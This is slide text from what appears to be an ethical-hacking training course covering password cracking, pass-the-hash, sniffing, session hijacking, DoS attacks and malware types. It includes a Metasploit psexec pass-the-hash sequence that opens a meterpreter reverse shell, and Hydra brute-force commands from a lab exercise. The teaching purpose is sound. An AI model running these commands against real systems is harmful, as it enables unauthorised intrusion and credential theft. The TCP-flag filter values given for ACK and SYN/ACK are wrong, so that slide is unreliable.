[slide44.xml] Lookups
[slide45.xml] Found  the Match Need  to recalculate   the chain We  compare  each   hash  to  the  “hash to   crack”  to  see  if  it   matches It  may  be complicated   but  the  storage  is   much  less  and  this  is   super fast Remember  this  is  a   time-memory  trade off –	 The  chain  calculations   are  all  done  ahead  of   time Initial Password Hash 1 Password 2 Hash 2 Password x Hash x Reduction Hash Function Hash Function Reduction Reduction Hash Function Password Z . . . Chain X Hash  to Crack
[slide46.xml] PTH Why crack the password when you can just Pass-The-Hash? Cracking passwords takes a great deal of time Guessing could cause an account lockout We can use the hashes from either the dumped SAM database, sniffed network traffic, or a RAM dump First, steal the hashes Next, strip out the administrator hash Then, place it in the memory of the target LSASS Attacker can now use Windows print/file sharing client tools to access the victim’s system
[slide47.xml] Cracking Tools
[slide48.xml] Metasploit PTH Using Metasploit for passing the hash Includes a psexec exploit by MS Sysinternals use exploit/windows/smb/psexec set RHOST <Target IP> set payload windows/meterpreter/reverse_tcp set SMBUser <administrator name> set SMBPass <administrator has> exploit More information:  https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/
[slide49.xml] Windows PTH Using a Windows Penetration Testing System  Use pass-the-hash toolkit (pshtoolkit) Last updated in 2008 https://www.secureauth.com/labs/open-source-tools/pass-hash-toolkit https://www.sans.org/reading-room/whitepapers/testing/pass-the-hash-attacks-tools-mitigation-33283 Using a Linux Penetration Testing System http://foofus.net/goons/jmk/passhash.html  Tool by JoMo-kun to patch SAMBA Last updated in 2007 pth-suite (Kali) More information:  https://labs.mwrinfosecurity.com/blog/pth-attacks-against-ntlm-authenticated-web-applications/ https://passing-the-hash.blogspot.com/
[slide50.xml] Do’s  &  Don’t Tips Never crack passwords on the target system May cause DoS (system performance) Also may require the installation of cracking tools Instead, pull a copy of the password file Be careful not to alter the file with editors e.g. – Using  gedit  to open the file and then save it could cause corruption of encrypted passwords 
[slide51.xml] JTR Initially developed for UNIX Currently runs on Linux, Windows, and Mac OSX Free and Open Source Software (FOSS) Available at  http://www.openwall.com/ Pro version available with several enhanced capabilities (Multi-lingual word list, etc.) Can crack various password representations LANMAN, DES, MD5, Blowfish The jumbo-john package includes support for a larger set of hashing algorithms Can crack NTLMv1, LANMAN Challenge/Response, and NT hashes using a patch and OpenSSL The ‘path’ and OpenSSL are used because of its crypto package and routines are needed Included with Kali Support for different performance processors MultiMedia eXtension  (MMX) Originally used to extend the x86 instruction set to improve video speed Streaming Single SIMD Extensions (SSE2)
[slide52.xml] JTR (cont.) How to conduct distributed cracking It is not directly supported, but can split up the work You could have several instances of JTR running  Each instance can crack a specific length MinLen = n; MaxLen = n Could also specify other options Connect to a single mounted file sever with john.pot In the John config file under [Incremental:] mode section Enter the minimum and maximum for each instance Ensure each instance has a different session id string Launch john with --session=[string]
[slide53.xml] JTR Modes Cracking operates in 4 different modes: Wordlist This is the simplest cracking mode Uses a text file with one word per file and some password files The recommended way to sort a wordlist file is to Tr A-Za-z < SOURCE | sort -u > TARGET tr = translate/squeeze sort -u = unique “Incremental” The most powerful cracking mode Includes password length limits and character set to use Parameters are defined in the config file section [Incremental:MODE] Can use a pre-defined incremental mode definition (one of “All”,”Alnum”,”Alpha”,”Digits”, or “LanMan” for LM hashes) or define a custom one
[slide54.xml] JTR Modes (cont.) Cracking operates in 4 different modes: “Single Crack” You should start with this mode Uses the logon names, “GECOS” / “Fulle Name” fields and users’ home directory as candidate passwords Is much faster than wordlist mode Allows for a larger set of word mangling rules If you run this mode on several password files simultaneously – you could crack faster than if done individually External Completed within the configuration section called [List.External:Mode] (mode is any name you assign the mode) Coded in a subset of C and compiled by john during startup and request
[slide55.xml] JTR Files john.rec file Stores the current status Updated every 10 minutes (by default) During the cracking process just press any key for the status Press Ctrl+C to abort the session saving its state to a file ($JOHN/john.rec by default) Hitting it twice will not update the john.rec file john.pot file When John cracks a password, it displays on screen/terminal Also stores the hash and cleartext password in the john.pot file If john is run again, it will not load any hashes it has already cracked and saved in the file $JOHN/john.pot If you maintain a large john.pot file of cracked Use: john –show passwordfile.txt This will show the passwords in the password file that has already been cracked in the john.pot file Use  john --restore  to restore an interrupted session
[slide56.xml] JTR Output John’s Output Displays current status Shows Guesses: how many passwors it has guessed so far Elapsed Time: how long its been running c/s: combinations per second (numer of passwords per second) Trying: the current password that is being tried
[slide57.xml] THC Hydra THC-Hydra by van Hauser Fast network logon cracker (THC = The Hackers Choice) Runs on Linux/UNIX/Mac OS X, but you can use Cygwin for Windows Currently this tool supports: AFP,Cisco AAA, Cisco auth, Cisco enable, HTTPS-GET, Vmware-Auth, VNC, XMPP, and many others Comparison of Features: http://www.thc.org/thc-hydra/network_password_cracker_comparison.html Configured to run against Single target system or read-in a list from a file Can generate guess attempts for a single user/file  Supports use a single password or set of passwords Easily supports SSL connection guessing over SSL Xhydra is the GUI
[slide58.xml] THC-Hydra pw-inspector Pw-inspector Provides ability to reduce wordlist files to match specific password policies  Prevents us from wasting time on unnecessary attempts Ingests a list of words from standard input, drops words not meeting criteria, and dumps the resulting list via standard output User can control standard input/output by -i and -o  -m[#] selects the minimum password length -M[#] selects the maximum password length -l must contain at least 1 lower-case character  -u must contain at least 1 upper-case character -n must contain at least 1 number -p must contain at least 1 printable character (symbols - !@#$) -s include non-printable ASCII characters (special characters) -c[#] tells how many pw criteria must be met  -c3 means that the password must meet 3 criteria’s
[slide59.xml] Activity: Hydra Log in to your Kali VM: Log into your Kali VM (root/ toor ) and open a terminal Execute the following commands, the ‘#’ represents the prompt: # cd Desktop # hydra -L users.txt -P passwords.txt [IP Address]  mysql  -V The correct username should be displayed on the screen: What is the correct username? Execute the following command, the ‘#’ represents the prompt: # hydra -l <found username> -P passwords.txt 10.10.10.100  mysql  -V The correct password should be displayed on the screen: What is the correct password?
[slide60.xml] Ophcrack Free and open source http://ophcrack.sourceforge.net/ Runs on Linux, Windows, Mac OS X Cracks Windows passwords Uses LM and NTLM hashes from different formats Dumps from SAM database Contains a brute force module for simple passwords Provides real-time graphs to analyze passwords Also available on a live CD

[slide71.xml] Summ a r y There are so many tools If you don’t have hashes available or access to the target system Password guessing may be your only option (Hydra) If you have access, you can try sniffing for cleartext passwords or C&R’s To sniff the C&R’s, you can use tools like tcpdump or CAIN If you have hashes that need to be cracked For LANMAN C&R or NTLMv1/2 captures, use CAIN For Windows LANMAN and NT hashes use: Rainbow tables like Ophcrack Standard password cracking tools like CAIN For salted hashed from Linux, use JTR If you have hashes and SMB with the target, use pass-the-hash (PTH toolkit, Meterpreter, fgdump)

[slide1.xml] Chapter Thirteen Sniffing, Wireshark, Session Hijacking
[slide2.xml] Hub vs Switch vs Router:
[slide3.xml] Sniffer A  packet analyzer  (also known as a  network analyzer ,  protocol analyzer  or  packet sniffer)  is a program or hardware device  that can intercept and log traffic that passes across a network. Sniffers .  Places your network card into promiscuous mode, so it receive all the data, not just packets addressed to it.  Sniffers operate at data link layer.
[slide4.xml] Passive vs Active sniffing Passive sniffing  for hubs.  Because hubs broadcast. Active sniffing  for switches . Because switches use unicast.  Sniffers operate at the data link layer
[slide5.xml] Implementing active sniffing Active sniffing  is performed when the user is on a switch.  Switch Port Analyzer (SPAN) is one method for actively sniffing a switch.  Also known as port mirroring, or switch mirroring, or just SPAN on Cisco switches.  Spanning  a port allows the attacker to capture all  traffic being forwarded by the switch.  This feature allows the switch to be configured (by attacker or administrator)  so that when data is forwarded to any port on the switch, it is also forwarded to the SPAN port. 
[slide6.xml] Packet analyzers Wireshark!!!!! CACE Pilot: D oes deep packet inspection. Dsniff: A  collection of tools for network auditing and hacking.  RSA NetWitness: C apture live traffic and do deep packet inspection. OmniPeek:  A commercial sniffer used on the Windows platform. Dsniff: A  collection of tools for network auditing and hacking. TCPdump:  One of the most used network sniffer/analyzers for Linux. TCPdump is a command-line tool that is great for displaying header information.  WinDump: T he Windows version of TCPdump.  This tool is similar to TCPdump in that it is a command-line tool that easily displays packet header information
[slide7.xml] Other methods for sniffing a switch Media Access Control (MAC) flooding and Address Resolution Protocol (ARP) poisoning
[slide8.xml] MAC flooding  MAC flooding is the act of overloading the switch's Content-Addressable Memory (CAM) table.  An attacker floods the switch with a very large number of Ethernet frames with fake source MAC address. At some point the CAM table fills up and the switch can hold no more entries, and reverts to a fail open state.   This means that all frames start flooding out all ports of the switch.  This allows the attacker to then sniff traffic that might not otherwise be visible.  The drawback of this attack is that the attacker is now injecting a large amount of traffic into the network.   
[slide9.xml] Mac Flooding Tools EtherFlood:  Floods a switched network with Ethernet frames with random hardware addresses. The effect on some switches is that they start sending traffic out on all ports so that you can sniff all the traffic on the network.  You can download EtherFlood from  http://ntsecurity.nu/toolbox/etherflood . Macof:  Floods the LAN with false MAC addresses in hopes of overloading the switch.  You can download it from http://monkey.org/~dugsong/dsniff
[slide10.xml] Wireshark!!!!!!!!! Wireshark Tutorial for Beginners - YouTube https://www.youtube.com/watch?v=TkCSr30UojM 14:22 Wireshark Tutorial for Beginners - Overview of the environment https://www.youtube.com/watch?v=6LGw31TsP6E Wireshark Packet Sniffing Usernames, Passwords, and Web Pages https://www.youtube.com/watch?v=r0l_54thSYU Intro to Wireshark: Basics + Packet Analysis!  https://www.youtube.com/watch?v=jvuiI1Leg6w How to Use Wireshark: A Complete Tutorial - Lifewire https://www.lifewire.com/wireshark-tutorial-4143298
[slide11.xml] Wireshark!!!!!! Top 10 Wireshark Filters https://www.youtube.com/watch?v=68t07-KOH9Y 12:23 The Complete Wireshark Course: Go from Beginner to Advanced! https://www.youtube.com/watch?v=vUdOxcRJgME 58:00 Wireshark Tutorial for Beginners https://www.youtube.com/watch?v=TkCSr30UojM 15:00 If you want to be a  wireshark  expert follow this set of  youtube  videos by Laura  Chappel Wireshark Tip 1: TCP Reassembly Setting https://www.youtube.com/watch?v=GLw-qXdK1MM 6:00
[slide12.xml] Wireshark !!!!! The top window shows the summary display.  It is a one-line-per-packet format. Once a packet is selected its (packet) details are displayed in the detail display.  The middle window shows the detail display.  Its job is to reveal the contents of the highlighted packet. If there is a plus sign in front of these fields. Clicking the plus sign reveals more detail.  The third and bottom display is the hex display.  The hex display represents the raw data.  There are three sections to the hex display.   The numbers to the  left  represent the offset in hex of the first byte of the line.  The  middle  section shows the actual hex value of each portion of the headers and the data.  The  right  side of the display shows the sniffers translation of the hex data into its (ASCII) format.   It’s a good place to look for usernames and passwords.
[slide13.xml] Wireshark Interface 13
[slide14.xml] Wireshark filters An important feature of a sniffer such as Wireshark is the capability it has to set up filters to view specific types of traffic. Filters can be defined in one of two ways: Capture filters:  Used when you know in advance what you are looking for.  They allow you to predefine the type of traffic captured. For example, you could set a capture filter to capture only HTTP traffic. Display filters:  Used after the traffic is captured. Although you might have captured all types of traffic, you could apply a display filter to show only ARP packets. Display filter examples include the following: Filter by IP address (for example,  ip.addr==192.168.123.1 ) Filter by multiple IP addresses (for example,  ip.addr==192.168.123.1 or ip.addr==192.168.123.2 ) Filter by protocol such as ARP, ICMP, HTTP, or BGP Filter by port (for example,  tcp.port==23 ) Filter by activity (for example,  tcp.flags.reset==1 )
[slide15.xml] Display Filter Expressions snmp || dns || icmp Display the SNMP or DNS or ICMP traffics. tcp.port == 25	  Display packets with TCP source or destination port 25. tcp.flags	 Display packets having a TCP flags tcp.flags.syn == 0x02	 Display packets with a TCP SYN flag. 15 If the filter syntax is correct, it will be highlighted in green,  otherwise if there is a syntax mistake it will be highlighted in red. Correct syntax Wrong syntax
[slide16.xml] More filter examples
[slide17.xml] TCP.Flags == Decimal Numbers FIN=1 SYN=2 RST=4 PSH=8 ACK=16 URG=32 Adding these numbers together (SYN + ACK = 18) allows you to simplify a Wireshark filter.   Example: tcp.flags == 0x2 looks for SYN packets,  tcp.flags == 0x16 looks for ACK packets tcp.flags == 0x18 looks for both SYN/ACK packets
[slide18.xml] Analyzing output Date and time stamp, Source and destination MAC address, Ethernet frame type and IP Packet length, Source and destination IP addresses, Transfer protocol, TTL, TOS, (Minimize delay, Maximize Throughput, etc) ID, (used to reassemble fragmented packets) IpLen (length of IP packet within Ethernet frame) DgmLen (total length)
[slide19.xml] Countermeasure to packet capture Restrict physical access  to all switches and network devices by using Port security and DHCP snooping Linux tools such as  Arpwatch  are also useful.   They keep track of MAC/IP address pairings and can report unusual changes. Monitor which devices generate a lot of reverse DNS lookups. By default, Wireshark performs reverse DNS lookups.  A device in promiscuous mode will typically reply to a ping with the correct IP address and an incorrect MAC address. This is caused by the fact that the NIC does not reject the incorrect MAC address. Tools like Capsa Network Analyzer, Arpwatch, and PromqryUI can be used to monitor for strange packets and anomalies.
[slide20.xml] Tips for taking CEH Practical Get to know Nmap and Wireshark.  Think about taking a Udemy course on these two.
[slide21.xml] Session Hijacking Hijacking contains a sniffing component, but goes further as the attacker actively injects packets into the network in an attempt to take over an authenticated connection.  Two types of session hijacking: Transport layer (TCP)  attacks: Focuses on the interception of packets during data transmission Application layer attacks : Focuses on obtaining or calculating session IDs.
[slide22.xml] Transport Layer hijacking Process  Identify and find an active session. Predict the sequence number. Take one of the parties offline. Take control of the session.
[slide23.xml] Sniffing or Predicting Sequence Numbers This process is much easier when the attacker and the victim are on the same segment of the network.     If both users are on a hub, this process requires nothing more than passive sniffing.    If a switch is being used, active sniffing is required.   if the attacker can sniff the sequence and acknowledgment numbers, a big hurdle has been overcome because otherwise it would be potentially difficult to calculate these numbers accurately. If the attacker and the victim are not on the same segment of the network, blind sequence number prediction must be performed.  Blind session hijacking is a more sophisticated and difficult attack because the sequence and acknowledgment numbers are unknown. With blind hijacking the session numbers must be guessed or the attacker may send several packets to the server to sample sequence numbers. If this activity is blocked at the firewall, the probe will fail.
[slide24.xml] How to predict sequence numbers  TCP attaches a sequenced number to each data packet that is transmitted.  If a transmission is not reported back as successful, a packet will be retransmitted.  By eavesdropping on traffic, these sequence numbers can be predicted and fake packets with the correct sequence number can be introduced into the data stream by a third party.  Tools like Ettercap and Hunt can be used for sequence prediction.
[slide25.xml] Detecting the Sequence Numbers Step 1  Client sends a packet with the SYN flag is set.  Observe that The sequence number is set to 0D5D0000.  The max segment size (MSS) is used to inform the server that the maximum amount of data that can be sent without fragmentation is 1470 bytes.  Step 2 , The server responds to the client’s request to start a TCP session and sends a packet containing, the SYN flag and the ACK flag.  Notice that the former sequence number is now an acknowledgment 0D5D0001, (Initial Sequence Number )+1.  Step 3  the client is sending a packet back to the server with the ACK flag set and an acknowledgment value of 3BDA55001, which is one more than the server’s ISN. 
[slide26.xml] When to launch session hijack Obviously, the hacker will need to do this before the session ends, or there will be no connection left to hijack.  But just as obviously, the attacker does not want to do this at the beginning of the session. If the hacker jumps in too early, the user will not have authenticated yet, and the connection will do little good.  The hacker needs to wait until the user has provided a password and authenticated.  This allows the hacker to steal trust. The trust doesn’t exist before the authentication has occurred. 
[slide27.xml] Take One of the Parties Offline With a sequence number in hand, the attacker is now ready to take the user connected to the server offline.  The attacker can use a denial of service, use source routing, or even send a reset to the user.  No matter what technique, the objective is to get the user out of the communication path and trick the server into believing that the hacker is a legitimate client.  All this activity can cause ACK storms. When the hacker is attempting to inject packets, he is going to be racing against the user to get his packets in first.  At some point during this process, the recipient of the faked packet is going to send an ACK  for it to the other host that it was originally talking to. This can cause an ACK storm
[slide28.xml] Take Control of the Session Now the hacker can take control of the session. As long as the hacker maintains the session, the hacker has an authenticated connection to the server.  This connection can be used to execute commands on the server in an attempt to further leverage the hacker’s position
[slide29.xml] ACK STORM A TCP "ACK storm" can occur when a system sends a TCP packet which contains an incorrect sequence number to another networked system.  The remote system will reply with a TCP ACK packet containing the expected sequence number and the originating system will send another packet with the incorrect sequence number.  This exchange of ACK packets will continue indefinitely back and forth and thus create an "ACK storm".
[slide30.xml] Application Layer Hijacking The whole point of Application layer hijacking is to be able to steal or predict a session token.  There are several ways in which these attacks can be carried out, which include session sniffing, predictable session token ID, man-in-the-middle attacks, man-in-the-browser attacks, client-side attacks, session replay attacks, and various session fixation attacks.  A session ID is a unique number that a Web site's server assigns a specific user for the duration of that user's visit (session).  The session ID can be stored as a cookie, form field, or URL. Most servers use algorithms that involve complex methods, such as factoring in the date and time of the visit along with other variables defined by the server administrator.
[slide31.xml] Predictable Session Token ID Many web servers use a custom algorithm or predefined pattern to generate session IDs. If the attacker can capture several IDs and analyze the pattern, he may be able to predict the session token ID. For example, suppose you were able to capture one ID and it was as follows: JSESSIONID =jBEXMZF20137XeM9756 This may look somewhat secure and sufficiently long. However, if you can capture several session tokens, patterns in their value may become evident, as shown here: JSESSIONID =jBEXMZE20137XeM9756; JSESSIONID =jBEXMZE20137XeM9757; JSESSIONID =jBEXMZE20137XeM9758; JSESSIONID =jBEXMZE20137XeM9759; JSESSIONID =jBEXMZE20137XeM9760; Upon discovering this sequence, all an attacker needs to do to steal a user’s accounts is base his attack on the subsequent session tokens as they are created when the user logs in.
[slide32.xml] Session Hijacking Videos Ethical Hacking - What is Session Hijacking https://www.youtube.com/watch?v=sqMCPxwzIf8 5:00 Session Hijacking - CompTIA Network+ N10-006 - 3.2 https://www.youtube.com/watch?v=z6nUbsY5B-w 5:00 Ethical Hacking - Types of Session Hijacking Attacks https://www.youtube.com/watch?v=QDvVcEwt980 8:00
[slide33.xml] Man-in-the-Middle Attacks Occurs when the attacker can get in between the client and server and intercept data being exchanged.  This allows the attacker to actively inject packets into the network in an attempt to take over an authenticated connection. 
[slide34.xml] Man-in-the-Browser Attacks Similar to a man-in-the-middle attack, but the attacker must first infect the victims Browser with a Trojan though some form of social engineering.  Ask the victim to install some plug-in to watch a video or maybe update a program or install a screensaver.   Once the victim is tricked into installing malware, the malware simply waits for the victim to visit a targeted site.  The man-in-the-browser malware can invisibly modify transactions information like the amount or destination.  It can also create additional transactions without the user knowing.     Because the requests are initiated from the victims computer, it is very difficult for the web service to detect that the requests are fake.  
[slide35.xml] Man-in-the-Browser Attack Man-in-the-Browser Attack on Bank of America's Web Site (LMG Security) https://www.youtube.com/watch?v=cm0wqPUv6mQ 5:00
[slide36.xml] Client-Side Attacks Client-side attacks use websites to target victim browser. Two types Client-side attacks: XSS  enables attackers to inject malicious scripts into a web sit that the victim trusts. Then the attacker tricks the victim into visiting the infected website where the victims browser is infected.  In this attack the victim trust the website. CSRF  occurs when the victim is logged in to a legitimate site and a malicious website at the same time. It allows the attacker to exploit the legitimate website thru the malicious website.  In this attack the website trust the victim.
[slide37.xml] XSS Videos What is Cross-Site Scripting? https://www.youtube.com/watch?v=ddcQ688eO7U 3:00 Hacking - Intro to Cross Site Scripting (XSS) https://www.youtube.com/watch?v=EZTXYCJk05w 32:00 XSS - Cross Site Scripting Explained https://www.youtube.com/watch?v=cbmBDiR6WaY 7:00
[slide38.xml] CSRF videos What is CSRF? https://www.youtube.com/watch?v=MBOMBZS2u-I What is a CSRF? | OWASP Top 10 2013 | Video by  Detectify https://www.youtube.com/watch?v=5joX1skQtVE 4:00 5:00CSRF Attacks https://www.youtube.com/watch?v=QJmYhIJraOo 5:00
[slide39.xml] Session (Replay) Fixation Attacks The session fixation attack is a type of session hijacking attack that works by stealing a valid session ID.  The attacker then tries to trick the user into authenticating with this ID.  Once  authenticated, the attacker now has access.  Session fixation explores a limitation in the way the web application manages a session ID.  Three common variations exist: session tokens hidden in a URL argument, session tokens hidden in a form field, and session tokens hidden in a cookie.
[slide40.xml] Well known session hijacking tools  IP Watcher : A commercial tool that enables you to monitor connections and  take over a session. T-Sight:  A commercial that can hijack any TCP sessions, monitor all network connections in real time, and observe the composition of any suspicious activity that takes place. Tools  for application layer session hijacking : Firesheep : A third-party add-on provides Firefox users an easy way to sniff for the usernames and passwords to many common websites such as Facebook.  Hamster: Sidejacking tools used to hijack application authentication. Session Thief: Performs HTTP session cloning by cookie stealing. Tamper IE: A simple Internet Explorer Browser Helper Object that allows tampering of HTTP requests.
[slide41.xml] Session Hijacking Tools Ettercap is the first tool discussed here.   Ettercap runs on Linux, BSD, Solaris 2.x, most flavors of Windows, and macOS.  It’s been included on Kali also. Ettercap will ARP spoof the targeted host so that any ARP requests for the target’s IP will be answered with the sniffer’s MAC address, allowing traffic to pass through the sniffer before Ettercap forwards it on.  This allows Ettercap to be used as an excellent man-in-the-middle tool. 
[slide42.xml] Preventing Hijacking There are two main mechanisms for dealing with hijacking problems: prevention and detection.   Prevention : The main way to protect against hijacking is encryption.   Limiting connections that can come into the network.   Configure your network to reject packets from the Internet that claim to originate from a local address.    If you must allow outside connections from trusted hosts, use Kerberos or IPsec.    
[slide43.xml] Session Hijacking http://resources.infosecinstitute.com/session-hijacking-cheat-sheet/
[slide44.xml] DoS (Booter) Students have discovered the power of DoS attacks. Some student hackers have used this technique as an easy way to get out of a test.  Just take down the school’s application servers for a few hours, and you no longer have to worry about passing an exam.  What makes this so simple is DoS offerings are easy and cheap to buy online, and you don’t even need to go to the dark web.  A simple search for the term  booter  will return hundreds of DoS services. Many booter sites accept payment via credit card, PayPal, Western Union, and bitcoin. 
[slide45.xml] Three categories of DoS/Ddos attacks Fragmentation:  attacks attempts to reconstruct fragmentation packets. Volumetric:   attacks that eat up bandwidth Application:  consume the resources necessary for the application to run.
[slide46.xml] DHCP starvation as a DoS   Can be achieved with tools such as Gobbler and/or Yersinia.  If enough requests are flooded onto the network, the attacker can completely exhaust the address space allocated by the DHCP servers.  Clients of the victim network are then starved of the DHCP resource(s), thus DHCP Starvation can be classified as a Denial of Service attack.  The attacker can also perform a MTM by deploying a Rogue DHCP Server on the network and perform man in the middle attacks, or simply set their machine as the default gateway and sniff packets. 
[slide47.xml] Preventing DHCP starvation  Mac Filtering:  limits the number of MAC addresses that can connect to the DHCP server.   DHCP snooping  can also be used to prevent DHCP starvation.   It by works by: Tracking the physical location of hosts Ensure that hosts only use the IP addresses assigned to them Ensure that only authorized DHCP servers are accessible
[slide48.xml] Ping of Death, Teardrop and Land Ping of Death An attacker fragments an ICMP packet and sends to the target.  When fragments are resembled, the resultant ICMP packet is larger than the maximum size and crashes the system. Teardrop A large number of garbled IP fragments with overlapping, oversized payloads are sent to the target.  Land Sends a packet with the same source and destination port and IP address in a TCP SYN packet. The receiving system typically does not know how to handle these malformed packets, which results in the system freezing or locking up, thereby causing a denial of service. 
[slide49.xml] SYN Flood Attack Sends a large number of fake packets with the SYN flag set.  This large number of half open TCP connections fills the buffer on a victim’s system and prevents it from accepting legitimate connections.   Systems connected to the Internet that provide services such as HTTP or SMTP are particularly vulnerable.  Because the source IP address is spoofed in a SYN attack, it is hard for the attacker to be identified.
[slide50.xml] Fraggle: Fraggle uses UDP echo packets.  UDP packets are sent to the  network broadcast address on port 7. UDP port 7 is a popular port because it is the echo port and will generate additional traffic.  Echo is a command that duplicates and displays what it is sent.  Thereby generating additional traffic. Even if port 7 is closed, the victim will still be blasted with a large number of ICMP unreachable messages. If enough traffic is generated, the network bandwidth will be used up and communication might come to a halt.
[slide51.xml] Chargen Linux and UNIX systems sometimes use Echo which uses port 7 and Chargen which uses port 19.  Echo does just what its name implies: repeats anything it is sent.  Chargen generates a complete set of ASCII characters over and over as fast as it can. It was designed for testing.  In this attack, the hacker uses forged UDP packets to connect the Echo service to the Chargen service on the target system. The result is that, between them, the two systems can consume all available network bandwidth. 
[slide52.xml] Smurf Sends a large number of spoofed ping packets addressed to the broadcast address of the target network with the source address listed as the victim. Many systems might possibly reply. The attack results in the victim network being flooded in ping responses.
[slide53.xml] Peer-to-Peer network DoS Attacks Peer-to-peer attacks are possible because of flaws in the direct connect (DC++) file sharing client protocol.  The DC++ file sharing client protocol is used to connect to a P2P network. Each one of those P2P clients are also listed in a client/server network hub.  It is this hub software that is at risk of compromise.  Older versions of the hub software allow attackers to instruct registered P2P clients to disconnect from the P2P network and connect to a system at the intended target’s location.  This can result in hundreds of thousands of connection attempts sent to a web server, flooding the service with traffic.
[slide54.xml] Permanent DoS Attacks A permanent DoS attack is known as a phlashing attack. The idea behind phlashing is to make the device or hardware permanently unusable .  While such attacks are considered largely theoretical, there are instances of tools being developed to permanently destroy data.  As an example, when Sony Pictures was hacked in 2014, the attackers used malware to make physical changes to hard drives that destroyed all data on the targeted machines.  In another instance, the Saudi Arabian Oil Co. (Aramco) lost about 30,000 hard drives when it was hit with Shamoon.   While this loss of service impacted the organization for several months, it could have been much worse if it had targeted the production infrastructure, as Saudi Arabia produces about 10 million barrels of oil every day.
[slide55.xml] Distributed Denial of Service Consists of two distinct phases.  First , during the pre-attack, the hacker must compromise computers scattered across the Internet and load software on these clients to aid in the attack.  The  second  step is the actual attack.  The attacker instructs the zombies to sent their malformed packets to the target network.  Command and Control software:  Used by the hacker to communicate to the zombies, and to install attack software on all of the zombies.
[slide56.xml] Components of a DDoS Three items: The master (bot hearder):  The system from which the client software is executed The zombie:  A subordinate system that executes the daemon process The target:  The object under attack
[slide57.xml] Counter measures for DoS attacks Throttling The concept is to slow down requests performed on behalf of each user and even potentially block them if they do too many things in too short a time. Black hole filtering  A countermeasure to mitigate a DDoS attack in which network traffic is routed into a “black hole,” (a null route) and is lost.  Traceback .   This technique is focused on tracing packets back to the entry points to the domain.  Once you have some idea as to whether the traffic is coming form a legitimate source or is spoofed and you know the entry point, the upstream ISP can configure its routers to reject all packets flooding the DDoS target. Mitigation: Mitigation makes use of a traffic-cleaning center that operates at different points on the Internet.  The traffic-cleaning nodes operate as scrubbers and only redirect clean valid traffic to the company’s web servers. Symantec, Verisign, and others offer these services. Egress filtering  can be performed by the organization’s border routers. This will reduce the chances that your network could be used to damage other networks and will provide two types of protection: Stop spoofed IP packets from leaving your network  Stop your network from being used as a broadcast amplification site
[slide58.xml] The End

[slide1.xml] Chapter Nine Malware

[slide4.xml] 
[slide5.xml] 
[slide6.xml] Viruses and Worms A  virus  typically needs a host program or file to infect. Viruses require some type of human interaction.  A  worm  can travel from system to system without human interaction.   When a worm executes, it can replicate again and infect even more programs and systems.  For example, a worm may email itself to everyone in your address book and then repeat this process again and again from each user it infects.  Spyware  is considered another type of malicious software.   In many ways, spyware is similar to a Trojan, in that most users don’t know that the program has been installed and it hides itself in an obscure location.    Spyware steals information from the user and also eats up bandwidth.  If that’s not enough, it can also redirect your web traffic and flood you with annoying pop-ups
[slide7.xml] Types and Transmission Methods Master boot record infection : This is the original method of attack. It works by attacking the master boot record of floppy disks or the hard drive. Shell virus:  Wraps itself around an application’s code, inserting its own code before the application’s. Cluster virus : modifies directory table entries so that user or system processes are pointed to the virus code instead of the applications . File infection : A virus that relies on the user to execute the file.  Meme:  Although not a true virus, it spreads like one and is basically a chain letter or email message that is continually forwarded.  Boot sector viruses:  Viruses living in RAM.   Encryption virus : Uses encryption to hide Metamorphic virus : Rewrites itself every time it infects a new file. Stealth virus:  AKA tunneling virus, intercepts the AV requests to the OS and returning them to itself instead of the OS.  The virus then alerts the request and sends them back to the AV as uninfected.
[slide8.xml] Types and Transmission Methods Macro infection :  Macro viruses exploit scripting services installed on your computer. You may remember the I Love You virus, a prime example of a macro infector. Polymorphic:  This type of virus can change its signature every time it replicates when its infection a new file.. Multipart:  This style of virus can use more than one infection method and targets both the boot sector and program files. One example is the NATAS (Satan spelled backward) virus. Specific targets Much of the malware today is written for  a specific target .   By limiting the spread  of the malware and targeting only a few victims, it makes it much harder for the antivirus company to find out about the malware and to create a signature to detect its presence.
[slide9.xml] Speed of infection Fast-infection  viruses infect any file that they are capable of infecting. Sparse infection  means that the virus takes its time in infecting other files or spreading its damage.  This technique is used to try to help the virus avoid infection.  
[slide10.xml] Hoaxes A virus hoax is nothing more than a chain letter or email that encourages you to forward it to your friends to warn them of the impending doom or some other notable event.   To convince readers to forward the hoax, the email will contain some official-sounding information that sounds valid.
[slide11.xml] Virus Payloads Viruses must place their payload somewhere. They can always overwrite a portion of the infected file, but to do so would destroy it.  Prependers  infect programs by placing their viral code at the beginning of the infected file.  Appenders  infect files by placing their code at the end of the infected file. This leaves the file intact, with the malicious code just added to the beginning or end of the file.
[slide12.xml] Common Virus Components (Required) Search routine:  Responsible for locating new files, disk space, or RAM to infect. (Required) Infection routine:  Responsible for copying the virus and attaching it to a suitable host. Payload routine  What the virus will do, could be harmful or a prank. Anti-detection routine.   As the name implies Trigger routine:   Its goal is to launch the payload at a given date and time. 
[slide13.xml] Script Kiddies and their Virus Tool Kits These kits are easy to use.  Most are point-and-click GUI applications.  Their limitation is that the viruses they create are variations of basic designs; therefore, antivirus providers have become adept at countering them. Sam’s Virus Generator JPS Virus Maker Andreinicks05’s Virus Maker Deadlines Virus Maker Sonic Bat Virus Creator Internet Work Maker Thing
[slide14.xml] Trojans and Trojan Types Trojans are programs that pretend to do one thing but when loaded actually perform another more malicious act.  Trojan Types The EC-Council groups Trojans into some primary types, they include command shell Trojans, graphical user interface (GUI) Trojans, email Trojans, document Trojans, defacement Trojans, botnet Trojans, Virtual Network Computing (VNC) Trojans, remote-access Trojans, data-hiding Trojans, banking Trojans, DoS Trojans, FTP Trojans, software-disabling Trojans, and covert-channel Trojans.  In reality, it’s hard to place some Trojans into a single type because many have more than one function. 
[slide15.xml] Trojans and Covert communications Many Trojans that open covert channels also function as backdoors.  A backdoor is any type of program that will allow a hacker to connect to a computer without going through the normal authentication process.   If a hacker can get a backdoor program loaded on an internal device, the hacker can then  come and go at will.    Some trojans spawn a connection on the victim’s computer connecting out to the hacker.   This is usually the least restrictive because companies are usually more concerned about what comes in the network than they are about what leaves the network.
[slide16.xml] Known Malware Port Numbers Name Default Ports Senna Spy 21 Death 2 Hackers Paradise  31 TCP Wrappers 421 Doom,  Satanz  Backdoor 666 DeepThroat 6670/6671 Silencer,  Webex 1001 NetBus 12345/12346 EvilFTP 23456 Back Orifice 31337/31339 NetSpy 31339 RAT 1095-98 SubSeven 1234 Shivka -Burka 1600 Trojan Cow 2001 Whack a Mole 12361-63
